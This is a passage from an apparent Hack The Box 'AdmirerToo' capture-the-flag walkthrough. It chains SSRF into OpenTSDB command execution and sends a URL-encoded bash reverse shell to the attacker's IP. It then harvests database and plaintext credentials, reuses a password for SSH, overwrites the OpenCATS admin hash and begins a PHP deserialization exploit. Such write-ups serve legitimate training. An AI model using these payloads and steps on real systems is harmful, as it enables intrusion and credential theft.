length 64</span><br><span class="line">05:23:04.246377 IP admirer-gallery.htb &gt; 10.10.14.8: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 1835, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">05:23:04.246401 IP 10.10.14.8 &gt; admirer-gallery.htb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 1835, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">05:23:05.232024 IP admirer-gallery.htb &gt; 10.10.14.8: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 1835, <span class="built_in">seq</span> 4, length 64</span><br><span class="line">05:23:05.232051 IP 10.10.14.8 &gt; admirer-gallery.htb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 1835, <span class="built_in">seq</span> 4, length 64</span><br></pre></td></tr></table></figure>

<p>We got the response back, we have a working RCE chained with SSRF. Now it’s time to gain a shell. Make sure to URL encode your reverse shell one-liner, something like below.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c <span class="string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.8/9001 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>

<p>url encoded:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%22%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%38%2f%39%30%30%31%20%30%3e%26%31%22</span><br></pre></td></tr></table></figure>

<p>Setup the redirector one more time and execute the SSRF via login by modifying values, then check the netcat listener.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/admiretoo]</span><br><span class="line">└─<span class="comment"># python3 ssrf_redirect.py 80 &#x27;http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=%5B33:system(%27%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%22%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%38%2f%39%30%30%31%20%30%3e%26%31%22%27)%5D&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json&#x27;</span></span><br><span class="line">10.10.11.137 - - [23/Jan/2022 05:33:28] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 302 -</span><br><span class="line">10.10.11.137 - - [23/Jan/2022 05:33:28] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 302 -</span><br><span class="line">10.10.11.137 - - [23/Jan/2022 05:34:27] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 302 -</span><br><span class="line">10.10.11.137 - - [23/Jan/2022 05:35:28] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 302 -</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/admiretoo]</span><br><span class="line">└─<span class="comment"># nc -lvp 9001</span></span><br><span class="line">Ncat: Version 7.92 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9001</span><br><span class="line">Ncat: Listening on 0.0.0.0:9001</span><br><span class="line">Ncat: Connection from 10.10.11.137.</span><br><span class="line">Ncat: Connection from 10.10.11.137:42416.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (535): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">opentsdb@admirertoo:/$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">opentsdb@admirertoo:/$ ^Z</span><br><span class="line">[1]+  Stopped                 nc -lvp 9001</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/admiretoo]</span><br><span class="line">└─<span class="comment"># stty raw -echo                                                                                                                  </span></span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/admiretoo]</span><br><span class="line">nc -lvp 9001                                                                                                                        </span><br><span class="line">            reset</span><br><span class="line">reset: unknown terminal <span class="built_in">type</span> unknown</span><br><span class="line">Terminal <span class="built_in">type</span>? screen</span><br><span class="line">opentsdb@admirertoo:/$ <span class="built_in">id</span></span><br><span class="line">uid=1000(opentsdb) gid=1000(opentsdb) <span class="built_in">groups</span>=1000(opentsdb)</span><br><span class="line">opentsdb@admirertoo:/$ <span class="built_in">whoami</span></span><br><span class="line">opentsdb</span><br></pre></td></tr></table></figure>

<h2 id="Privilege-Escalation-User"><a href="#Privilege-Escalation-User" class="headerlink" title="Privilege Escalation - User"></a>Privilege Escalation - User</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">opentsdb@admirertoo:/home/jennifer$ <span class="built_in">cat</span> user.txt </span><br><span class="line"><span class="built_in">cat</span>: user.txt: Permission denied</span><br><span class="line">opentsdb@admirertoo:/home/jennifer$ grep <span class="string">&#x27;bash&#x27;</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">jennifer:x:1002:100::/home/jennifer:/bin/bash</span><br></pre></td></tr></table></figure>

<p>We need to escalate our privileges to ‘Jennifer’ user. After running ‘Linpeas’ application, we will get database credentials.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">╔══════════╣ Searching passwords <span class="keyword">in</span> config PHP files</span><br><span class="line">define(<span class="string">&#x27;DATABASE_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DATABASE_NAME&#x27;</span>, <span class="string">&#x27;cats_dev&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DATABASE_PASS&#x27;</span>, <span class="string">&#x27;adm1r3r0fc4ts&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DATABASE_USER&#x27;</span>, <span class="string">&#x27;cats&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>This is not from OpenTSDB configuration file. But, from ‘OpenCats’ application directory.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">opentsdb@admirertoo:/opt/opencats$ <span class="built_in">ls</span></span><br><span class="line">ajax             constants.php      issue_template.md  rebuild_old_docs.php</span><br><span class="line">ajax.php         db                 js                 rss</span><br><span class="line">attachments      docker             lib                scripts</span><br><span class="line">careers          Error.tpl          LICENSE.md         src</span><br><span class="line">careersPage.css  ie.css             main.css           temp</span><br><span class="line">CHANGELOG.MD     images             modules            <span class="built_in">test</span></span><br><span class="line">ci               index.php          not-ie.css         upload</span><br><span class="line">composer.json    INSTALL_BLOCK      optional-updates   vendor</span><br><span class="line">composer.lock    installtest.php    QueueCLI.php       wsdl</span><br><span class="line">config.php       installwizard.php  README.md          xml</span><br></pre></td></tr></table></figure>

<p><em><strong>OpenCATS is a completely free open source ATS. Designed for recruiters, OpenCATS provides basic ATS services such as candidate tracking, resume parsing, and job requisition and posting.</strong></em></p>
<p>OpenCats is probably running on the machine and from it’s configuration file we got database credentials. Let’s login into DB and look for any passwords.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">opentsdb@admirertoo:/opt/opencats$ mysql -D cats_dev -u cats -padm1r3r0fc4ts</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection <span class="built_in">id</span> is 101</span><br><span class="line">Server version: 10.3.31-MariaDB-0+deb10u1 Debian 10</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [cats_dev]&gt; select password,user_name,user_id from user\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line"> password: dfa2a420a4e48de6fe481c90e295fe97</span><br><span class="line">user_name: admin</span><br><span class="line">  user_id: 1</span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line"> password: cantlogin</span><br><span class="line">user_name: cats@rootadmin</span><br><span class="line">  user_id: 1250</span><br><span class="line">*************************** 3. row ***************************</span><br><span class="line"> password: f59f297aa82171cc860d76c390ce7f3e</span><br><span class="line">user_name: jennifer</span><br><span class="line">  user_id: 1251</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>We have user password, but they are stored in hashed format (MD5). I couldn’t able to crack the hashes. However, I found passwords in ‘admirer’ directory.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">opentsdb@admirertoo:~$ grep -iRl <span class="string">&#x27;password&#x27;</span> /var/www/adminer/ 2&gt;/dev/null</span><br><span class="line">/var/www/adminer/plugins/oneclick-login.php</span><br><span class="line">/var/www/adminer/plugins/plugin.php</span><br><span class="line">/var/www/adminer/adminer-included-0ae90598f37b20e3e7eb122c427729ed.php</span><br></pre></td></tr></table></figure>

<p>There are three files probably with saved passwords. But when I checked those files,those are not actual passwords. However, inside ‘plugins’ directory there’s another directory called ‘data’, it has another password.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">opentsdb@admirertoo:/var/www/adminer/plugins/data$ <span class="built_in">cat</span> servers.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">return</span> [</span><br><span class="line">  <span class="string">&#x27;localhost&#x27;</span> =&gt; array(</span><br><span class="line">//    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;admirer&#x27;</span>,</span><br><span class="line">//    <span class="string">&#x27;pass&#x27;</span>     =&gt; <span class="string">&#x27;bQ3u7^AxzcB7qAsxE3&#x27;</span>,</span><br><span class="line">// Read-only account <span class="keyword">for</span> testing</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;admirer_ro&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pass&#x27;</span>     =&gt; <span class="string">&#x27;1w4nn4b3adm1r3d2!&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;label&#x27;</span>    =&gt; <span class="string">&#x27;MySQL&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;databases&#x27;</span> =&gt; array(</span><br><span class="line">      <span class="string">&#x27;admirer&#x27;</span> =&gt; <span class="string">&#x27;Admirer DB&#x27;</span>,</span><br><span class="line">    )</span><br><span class="line">  ),</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p>This password has reused for ‘Jennifer’ user’s login. Let’s ssh and read the user flag.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">jennifer:bQ3u7^AxzcB7qAsxE3</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/admiretoo]</span><br><span class="line">└─<span class="comment"># ssh jennifer@10.10.11.137</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.11.137 (10.10.11.137)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:6GHqCefcB0XKD8lrY40SKb5COmsxVdTiXV4NYplmxbY.</span></span><br><span class="line"><span class="string">This key is not known by any other names</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.11.137<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">jennifer@10.10.11.137&#x27;</span>s password: </span><br><span class="line">Permission denied, please try again.</span><br><span class="line">jennifer@10.10.11.137<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux admirertoo 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">No mail.</span></span><br><span class="line"><span class="string">Last login: Sun Jan 23 10:30:18 2022 from 10.10.14.10</span></span><br><span class="line"><span class="string">jennifer@admirertoo:~$ id</span></span><br><span class="line"><span class="string">uid=1002(jennifer) gid=100(users) groups=100(users)</span></span><br><span class="line"><span class="string">jennifer@admirertoo:~$ whoami</span></span><br><span class="line"><span class="string">jennifer</span></span><br><span class="line"><span class="string">jennifer@admirertoo:~$ cat user.txt </span></span><br><span class="line"><span class="string">44d517c8732f33ce2b12bed6e24b587f</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2134.jpg"></li>
</ul>
<p>Let’s find any active services running on the machine.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ systemctl list-units --<span class="built_in">type</span>=service</span><br><span class="line">UNIT                               LOAD   ACTIVE SUB     DESCRIPTION                                                       </span><br><span class="line">apache2.service                    loaded active running The Apache HTTP Server                                            </span><br><span class="line">apache2@opencats.service           loaded active running The Apache HTTP Server                                            </span><br><span class="line">apparmor.service                   loaded active exited  Load AppArmor profiles                                            </span><br><span class="line">console-setup.service              loaded active exited  Set console font and keymap                                       </span><br><span class="line">cron.service                       loaded active running Regular background program processing daemon                      </span><br><span class="line">dbus.service                       loaded active running D-Bus System Message Bus                                          </span><br><span class="line">fail2ban.service                   loaded active running Fail2Ban Service                                                  </span><br><span class="line">getty@tty1.service                 loaded active running Getty on tty1                                                     </span><br><span class="line">hbase.service                      loaded active running HBase                                                             </span><br><span class="line">ifup@eth0.service                  loaded active exited  ifup <span class="keyword">for</span> eth0                                                     </span><br><span class="line">ifupdown-pre.service               loaded active exited  Helper to synchronize boot up <span class="keyword">for</span> ifupdown                        </span><br><span class="line">keyboard-setup.service             loaded active exited  Set the console keyboard layout                                   </span><br><span class="line">kmod-static-nodes.service          loaded active exited  Create list of required static device nodes <span class="keyword">for</span> the current kernel</span><br><span class="line">mariadb.service                    loaded active running MariaDB 10.3.31 database server                                   </span><br><span class="line">networking.service                 loaded active exited  Raise network interfaces                                          </span><br><span class="line">nftables.service                   loaded active exited  nftables                                                          </span><br><span class="line">open-vm-tools.service              loaded active running Service <span class="keyword">for</span> virtual machines hosted on VMware                     </span><br><span class="line">opentsdb.service                   loaded active running LSB: Starts OpenTSDB TSD                                          </span><br><span class="line">php7.3-fpm.service                 loaded active running The PHP 7.3 FastCGI Process Manager                               </span><br><span class="line">rsyslog.service                    loaded active running System Logging Service                                            </span><br><span class="line">ssh.service                        loaded active running OpenBSD Secure Shell server                                       </span><br><span class="line">systemd-journal-flush.service      loaded active exited  Flush Journal to Persistent Storage                               </span><br><span class="line">systemd-journald.service           loaded active running Journal Service                                                   </span><br><span class="line">systemd-logind.service             loaded active running Login Service                                                     </span><br><span class="line">systemd-modules-load.service       loaded active exited  Load Kernel Modules                                               </span><br><span class="line">systemd-random-seed.service        loaded active exited  Load/Save Random Seed                                             </span><br><span class="line">systemd-remount-fs.service         loaded active exited  Remount Root and Kernel File Systems                              </span><br><span class="line">systemd-sysctl.service             loaded active exited  Apply Kernel Variables                                            </span><br><span class="line">systemd-sysusers.service           loaded active exited  Create System Users                                               </span><br><span class="line">systemd-timesyncd.service          loaded active running Network Time Synchronization                                      </span><br><span class="line">systemd-tmpfiles-setup-dev.service loaded active exited  Create Static Device Nodes <span class="keyword">in</span> /dev                                </span><br><span class="line">systemd-tmpfiles-setup.service     loaded active exited  Create Volatile Files and Directories                             </span><br><span class="line">systemd-udev-trigger.service       loaded active exited  udev Coldplug all Devices                                         </span><br><span class="line">systemd-udevd.service              loaded active running udev Kernel Device Manager                                        </span><br><span class="line">systemd-update-utmp.service        loaded active exited  Update UTMP about System Boot/Shutdown                            </span><br><span class="line">systemd-user-sessions.service      loaded active exited  Permit User Sessions                                              </span><br><span class="line">user-runtime-dir@1002.service      loaded active exited  User Runtime Directory /run/user/1002                             </span><br><span class="line">user@1002.service                  loaded active running User Manager <span class="keyword">for</span> UID 1002                                         </span><br><span class="line">vgauth.service                     loaded active running Authentication service <span class="keyword">for</span> virtual machines hosted on VMware      </span><br><span class="line"></span><br><span class="line">LOAD   = Reflects whether the unit definition was properly loaded.</span><br><span class="line">ACTIVE = The high-level unit activation state, i.e. generalization of SUB.</span><br><span class="line">SUB    = The low-level unit activation state, values depend on unit <span class="built_in">type</span>.</span><br><span class="line"></span><br><span class="line">39 loaded units listed. Pass --all to see loaded but inactive units, too.</span><br><span class="line">To show all installed unit files use <span class="string">&#x27;systemctl list-unit-files&#x27;</span>.</span><br></pre></td></tr></table></figure>

<p>Two services are suspicious, OpenCats and Fail2Ban. We have found the OpenCats directory previously. OpenCats is running on port 8080.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ curl localhost:8080 | grep opencats</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  3665  100  3665    0     0   325k      0 --:--:-- --:--:-- --:--:--  357k</span><br><span class="line">&lt;title&gt;opencats - Login&lt;/title&gt;</span><br><span class="line">&lt;span <span class="built_in">id</span>=<span class="string">&quot;mainLogo&quot;</span>&gt;opencats&lt;/span&gt;&lt;br /&gt; </span><br><span class="line">&lt;span style=<span class="string">&quot;font-size: 12px;&quot;</span>&gt;&lt;a href=<span class="string">&quot;http://forums.opencats.org &quot;</span>&gt;opencats support forum&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">Based upon original work and Powered by &lt;a href=<span class="string">&quot;http://www.opencats.org&quot;</span> target=<span class="string">&quot;_blank&quot;</span>&gt;OpenCATS&lt;/a&gt;.&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>Let’s check Fail2Ban version.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ fail2ban-server -V</span><br><span class="line">Fail2Ban v0.10.2</span><br></pre></td></tr></table></figure>

<p>It has a vulnerability in mailing action.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZhaWwyYmFuL2ZhaWwyYmFuL3NlY3VyaXR5L2Fkdmlzb3JpZXMvR0hTQS1tOTg1LTNmM3YtY3dtbQ==">Possible RCE vulnerability in mailing action using mailutils (mail-whois)<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>First look into Opencats. Let’s forward that port via SSH or however you like. I am forwarding that port to my machine on port 9000. Let’s visit the site.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 9000:127.0.0.1:8080 jennifer@10.10.11.137</span><br></pre></td></tr></table></figure>

<p>The homepage gives us the version information, that is 0.9.5.2.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlL0NWRS0yMDIxLTI1Mjk0Lw==">CVE-2021-25294<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><em><strong>OpenCATS through 0.9.5-3 unsafely deserializes index.php?m&#x3D;activity requests,leading to remote code execution. This occurs because lib&#x2F;DataGrid.php calls unserialize for the parametersactivity:ActivityDataGrid parameter. The PHP object injection exploit chain can leverage an __destruct magic method in guzzlehttp.</strong></em></p>
<p>For this we need to authenticate first, I couldn’t crack the admin password.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [cats_dev]&gt; select user_name,password,user_id from user\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">user_name: admin</span><br><span class="line">password: f59f297aa82171cc860d76c390ce7f3e</span><br><span class="line">user_id: 1</span><br></pre></td></tr></table></figure>

<p>However, we have access to it’s database, we can update the row of admin with our own password.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">482c811da5d5b4bc6d497ffa98491e38:password123</span><br><span class="line"></span><br><span class="line">MariaDB [cats_dev]&gt; update user <span class="built_in">set</span> password = <span class="string">&#x27;482c811da5d5b4bc6d497ffa98491e38&#x27;</span> <span class="built_in">where</span> user_id = 1;</span><br><span class="line">Query OK, 1 row affected (0.001 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">MariaDB [cats_dev]&gt; select password,user_name,user_id from user\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line"> password: 482c811da5d5b4bc6d497ffa98491e38</span><br><span class="line">user_name: admin</span><br><span class="line">  user_id: 1</span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line"> password: cantlogin</span><br><span class="line">user_name: cats@rootadmin</span><br><span class="line">  user_id: 1250</span><br><span class="line">*************************** 3. row ***************************</span><br><span class="line"> password: f59f297aa82171cc860d76c390ce7f3e</span><br><span class="line">user_name: jennifer</span><br><span class="line">  user_id: 1251</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>Make sure to convert you desired password to MD5 hash. Once you update, you can login with the password.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2135.jpg"></li>
</ul>
<p>We have access to admin dashboard. This below blog has explained how this attack works.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9zbm9vcHlzZWN1cml0eS5naXRodWIuaW8vd2ViLWFwcGxpY2F0aW9uLXNlY3VyaXR5LzIwMjEvMDEvMTYvMDlfb3BlbmNhdHNfcGhwX29iamVjdF9pbmplY3Rpb24uaHRtbA==">OpenCATS PHP Object Injection to Arbitrary File Write<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>For this to work we need to switch to activities tab and click on ‘date’ and intercept the request in Burp Suite.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?m=activity&amp;parametersactivity%3AActivityDataGrid=a%3A8%3A%7Bs%3A10%3A%22rangeStart%22%3Bi%3A0%3Bs%3A10%3A%22maxResults%22%3Bi%3A15%3Bs%3A13%3A%22filterVisible%22%3Bb%3A0%3Bs%3A9%3A%22startDate%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22endDate%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22period%22%3Bs%3A37%3A%22DATE_SUB%28CURDATE%28%29%2C+INTERVAL+1+MONTH%29%22%3Bs%3A6%3A%22sortBy%22%3Bs%3A15%3A%22dateCreatedSort%22%3Bs%3A13%3A%22sortDirection%22%3Bs%3A3%3A%22ASC%22%3B%7D HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:9000</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://127.0.0.1:9000/index.php?m=activity</span><br><span class="line">Cookie: CATS=95dvh0oeepi123t462f8l9ogjn</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br></pre></td></tr></table></figure>

